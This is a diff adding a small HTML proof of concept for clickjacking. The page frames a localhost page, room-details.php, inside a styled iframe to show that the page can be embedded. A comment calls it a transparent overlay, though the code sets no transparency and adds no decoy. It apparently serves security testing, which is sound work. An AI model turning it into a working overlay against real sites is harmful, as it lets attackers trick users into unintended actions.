@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Clickjacking PoC</title>
+  <style>
+    /* Styling to make the page visually appealing */
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(to right, #ff7e5f, #feb47b);
+      color: #fff;
+      text-align: center;
+      padding: 50px;
+    }
+
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+    }
+
+    .iframe-container {
+      position: relative;
+      display: inline-block;
+      width: 1200px;
+      height: 650px;
+      border-radius: 15px;
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+      overflow: hidden;
+      background: #fff;
+      margin: 30px auto;
+    }
+
+    .iframe-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+  </style>
+</head>
+<body>
+
+  <h1>Welcome to Our ClickJacking Page</h1>
+  <!-- Transparent iframe overlay for clickjacking -->
+  <div class="iframe-container">
+    <iframe src="https://127.0.0.1/room-details.php" title="Iframe Example"></iframe>
+  </div>
+
+</body>
+</html>
